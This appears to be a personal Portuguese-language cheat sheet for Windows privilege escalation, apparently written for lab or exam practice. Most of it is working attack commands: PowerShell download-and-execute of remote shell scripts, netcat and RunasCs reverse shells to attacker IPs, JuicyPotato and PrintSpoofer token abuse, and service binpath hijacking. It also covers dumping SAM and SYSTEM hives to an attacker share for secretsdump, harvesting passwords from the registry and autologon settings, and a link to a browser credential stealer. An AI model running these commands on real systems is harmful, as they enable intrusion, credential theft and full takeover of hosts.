# Windows PrivEsc

1. [Check](<Windows_PrivEsc.md#DirectoryEnum>) Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio
2. [Check](<Windows PrivEsc.md#Winpeas>) Rodar o WinPEAS para verificar se existe algum servico disponivel para exploracao com permissoes demais. Aqui temos que usar o accesschk
3. [Check](<Windows PrivEsc.md#PowerUp>) Rodar o PowerUp
4. [Check](<Windows PrivEsc.md#Credenciais no registro>) checar credenciais no registro do windows
5. checar os servicos que estao rodando na maquina para ver se temos permissao de alteracao em algum deles
6. [Check](<Windows PrivEsc.md#ScheduledTasks>) checar as scheduleds tasks
7. verificar se existe algum servico rodando em localhost para exploracao de escalacao de privilegio
8. em sistemas mais antigos, explorar vulnerabilidades de kernel
9. Ja peguei cenarios em que uma maquina virtual estava instalada na maquina e foi possivel obter credenciais no historico desta mesma maquina
10. Testes mais basicos como testar a propria credencial do usuário ja comprometido para o Administrator tambem pode
11. Enumerar os discos da máquina e procurar por senhas ou arquivos sensíveis dentro destes.
12. Kernel exploits. Verificar a versão de kernel do windows. systeminfo
13. whoami /all ou /priv. Verificar privilégios do usuário. Vale considerar que estamos a procura do SEImpersonate.
14. Navegar nos diretórios C:\users, C:\program files, c:\program files (x86) afim de achar algum arquivo com informação sensível ou binário que possa ser explorado com exploits, por exemplo.
15. Winpeas e PowerUp
16. Verificar serviços em localhost
17.
    9. Verificar scheduled taskts
18. Verificar credenciais em cache
19. Verificar credenciais no registro
20. Verificar unquoted service path (DLL Hijacking)
21. Weak service permissions

Depois considerar esse link para verifcar uma ferramenta para obtenção de credencais em processos como firefox chrome e afins...

https://github.com/putterpanda/mimikittenz

## Com credencial

```
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell2.ps1')" -Credential $cred
```

Outra opção seria:

```
$username = "arkham\batman"
$password = "Zx^#QZX+T!123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
new-pssession -computername . -credential $cred
```
Ainda outra opção seria com runas:

```
runas/user:acosta ".\nc64.exe -e C:\windows\system32\cmd.exe 192.168.0.165 8083"
```
Existe um runas compilado que pode ser encontrado em:
https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

```
.\runasCs.exe username password -r <IP_ATACANTE>:<porta_atacante> cmd
.\runasCs.exe username password -r <IP_ATACANTE>:<porta_atacante> powershell
```

## Kernel exploitation

https://github.com/SecWiki/windows-kernel-exploits

    Winver 

```
systeminfo > si.txt
copy si.txt \\10.10.14.17\smb\si.txt
```

Na máquina do atacante

### Windows Exploit Suggester

```
pip install wesng

sudo ln -s /home/acosta/.local/bin/wes /usr/bin/wes

wes --update
dos2unix si.txt
wes si.txt
```

Pesquisas no google

## User Permissions (whoami /priv)

Teste basiquinho primeiro, porque mudei de ideia:

```
whoami /priv
```

Aqui vale considerar os exploits Potatoes:

```
PrintSpoofer32.exe -i -c powershell
```

O exploit abaixo tem que considerar as portas abertas no firewall para ele funcionar adequadamente:

```
./jp.exe -t * -p c:\temp\s.bat [-l porta]
```
```
whoami /priv

SeImpersonate

PrintSpoofer32.exe -i -c powershell

JuicyPotato.exe -t * -p shell.bat -l 4444

jp.exe -t * -p shell.bat -l 4444

whoami /all

SE IMPERSONATE
```
**LEMBRAR DE QUE AS PORTAS UTILIZADAS NO COMANDO DEVEM ESTAR LIBERADAS NO FIREWALL.**

Esse juicyPotato que funcionou é o que se encontra neste link:

[https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip](https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip)

agora sim uma checada nos diretórios da máquina:

## DirectoryEnum

```
gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
cd c:\users
dir
#Tentar esta abordagem durante a prova pode ser mais interessante
dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
```
```
gci -recurse -filter <file_name> [-Path]
```

```
cd c:\users
gci -recurse
```

```
dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
```

```
gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
```

![qownnotes-media-PvAXBV](../media/qownnotes-media-PvAXBV.png)

Exemplos que não são exploráveis:

![qownnotes-media-QpQnUo](../media/qownnotes-media-QpQnUo.png)

![qownnotes-media-vflhHT](../media/qownnotes-media-vflhHT.png)

Verificar todas as pastas do(s) usuário(s):

```
cd c:\users
gci -recurse


wmic logicaldisk get deviceid, volumename, description

#powershelll
powershell -c get-psdrive -psprovider filesystem

mountvol

Depois de enumerar, eh interessante montarmos o volume pra verificar se temos algo.

mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
```

## Winpeas

```
(new-object net.webclient).downloadfile('http://10.10.14.14/4-privilege%20escalation/winPEASx64.exe', 'c:\temp\w.exe')
./w.exe
```

## PowerUp

```
(new-object net.webclient).downloadfile('http://10.10.14.14/4-privilege%20escalation/PowerUp.ps1', 'c:\temp\p.ps1')
. ./p.ps1]
invoke-allchecks
```

## ATENTIONPOINTS

Aqui um ponto de atenção é que, caso não encontre nada na máquina, vale considerar que o serviço pelo qual entramos (geralmente web app), pode fornecer um ponto de entrada para a escalação de priilégio por meio da aplicação que está rodando no contexto system. às vezes a verificação ocorre por tentiva e erro mesmo.

Detalhe que daqui em diante, as enumerações são todas vistas nos processos automatizados. Então é bom não deixar de verificar este último ponto e um double check manual mesmo.

## AlwaysElevated

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

## Find all weak file permissions per drive.

```
(new-object net.webclient).downloadfile('http://10.10.14.17/4-privilege%20escalation/accesschk64.exe', 'c:\temp\a.exe')

.\a.exe -uwqs -accepteula Users c:\*.*
.\a.exe -uwqs -accepteula "Authenticated Users" c:\*.*

Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

Full name

```
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uws "Everyone" "C:\Program Files"
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

## Binary planting

```
sc config [service_name] binpath= "C:\temp\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]
```

Uma vez obtido system na máquina, é possível extrair a SAM da seguinte maneira:

por meio dos registros:

Na máquina vítima

```
reg save HKLM\SAM \\10.10.14.11\smb\sam
reg save HKLM\SYSTEM \\10.10.14.11\smb\system
```

Na máquina atacante:

```
impacket-secretsdump -sam sam -system system local
```

Acessando diretamente a o hard drive da máquina:

```
sudo guestmount --add '/tmp/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro -v /mnt/vhd

cp vhd/Windows/System32/config/SAM /home/acosta/Downloads
cp vhd/Windows/System32/config/SYSTEM /home/acosta/Downloads
impacket-secretsdump -sam SAM -system SYSTEM local
```

ou até mesmo fazendo o port forwarding

## Credenciais no registro

```
reg query HKLM /f *password* /t REG_SZ /s

reg query HKLM /f teamviewer /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s
```

### Autologon

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7 /v SecurityPasswordAES

(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName   

(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword   
```

## Unquoted Service Paths

```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

## ScheduledTasks

```
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v > schtasks.txt
copy schtasks.txt \\10.10.14.17\smb\scht.txt

dos2unix scht.txt
cat scht.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

![qownnotes-media-MkSFLk](../media/qownnotes-media-MkSFLk.png)

![qownnotes-media-eaAziX](../media/qownnotes-media-eaAziX.png)

![qownnotes-media-aeBsJo](../media/qownnotes-media-aeBsJo.png)

![qownnotes-media-bOauze](../media/qownnotes-media-bOauze.png)

Usando accesschk.exe

```
accesschk.exe /accepteula -quvw <username> <filename>
```

![qownnotes-media-JfEeCP](../media/qownnotes-media-JfEeCP.png)

## Cached credencials

```
cmdkey /list
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

## EnumerateProcess

```
get-process
wmic process
tasklist
tasklist /svc
tasklist /v /fi "username eq system"
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

## Enumerate device drivers

```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object Display Name, Start Mode, Path

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

    mountvol

Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos algo.

    mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\


## firwewall rules enumeration

    netsh advfirewall show currentprofile
    
    netsh advfirewall firewall show rule name=all
    
     Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
    
    
## Services enumeration and Network information

A presença de interfaces virtuais pode aferir a ideia de existir máquinas virtuais na máquina ou de anti vírus instalado


Esse comando enumera as conexões e portas abertas, pelas quais são fornecidos os serviços de rede tais como banco de dados, aplicações web e/ou serviços que estajam vulneráveis a algum tipo de exploit público, por exemplo .
Pesquisando a respeito do serviço, podemos encontrar fragilidades que podemos explorar para escalar privilégios na máquina. Mas, claro, sempre visando serviços que rodam em modo system (que é nosso alvo)


    ipconfig /all
    route print
    netstat -ano #(process ID como -o, requer privilégios administrativos)
    netstat -anb #(nome do binário com o -b, requer privilégios administrativos)

### Weak service permissions

![qownnotes-media-jCADRm](../../media/qownnotes-media-jCADRm.png)

![qownnotes-media-Yhpwrk](../../media/qownnotes-media-Yhpwrk.png)

    ./accesschk.exe -ucwqv UsoSvc /accepteula
    
    ./accesschk.exe -ucwqv <servicename> /accepteula
    
Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
    
    whoami /all

![qownnotes-media-zdSaRr](../../media/qownnotes-media-zdSaRr.png)

    sc.exe config usosvc binpath="C:\temp\revshell.exe"

![qownnotes-media-QfiKZv](../../media/qownnotes-media-QfiKZv.png)

    net stop usosvc
    net start usosvc

## PasswordEnumeration

    findstr /si password *.doc *.txt *.ini *.config
    
    gci -recurse -filter passwd*
    
    dir /s *pass* == *cred* == *ssh* == *.config*
    
    reg query HKLM /f *password* /t REG_SZ /s
    
    reg query HKLM /f teamviewer /t REG_SZ /s
    
    reg query HKCU /f password /t REG_SZ /s
    
    
    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
    
    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
    
    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 
## Writable files
 
     Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
